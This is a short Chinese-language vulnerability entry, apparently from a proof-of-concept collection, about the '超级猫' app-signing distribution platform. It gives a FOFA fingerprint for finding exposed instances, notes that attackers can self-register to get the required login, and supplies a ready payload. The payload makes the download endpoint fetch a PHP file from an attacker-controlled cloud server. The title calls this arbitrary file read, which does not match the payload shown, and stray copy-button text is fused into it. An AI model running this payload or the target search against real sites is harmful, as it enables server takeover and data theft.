# C15-2超级猫-签名APP分发平台-任意文件读取

## 漏洞描述：

超级猫超级签名分发平台是一个安卓苹果APP分发平台，能够对所有安卓苹果的APP进行签名分发，使所有自行开发的APP能够签名使用，包括登录注册等功能，还提供有SDK

## fofa语法：

"/themes/97013266/public/static/css/pc.css"

## 漏洞复现：

注意这里需要先登录，这处可以直接注册的 payload：

```auto
/user/profile/download?url=http://云服务器地址/111.php&path=1Copy to clipboardErrorCopied
```

效果图： ![效果图](https://github.com/user-attachments/assets/455cedb5-1ab7-494f-91aa-9d3a32a8a727)
 
效果图： ![效果图](https://github.com/user-attachments/assets/ab3bdabc-a378-4482-8339-eb8a2ddbe0bc)
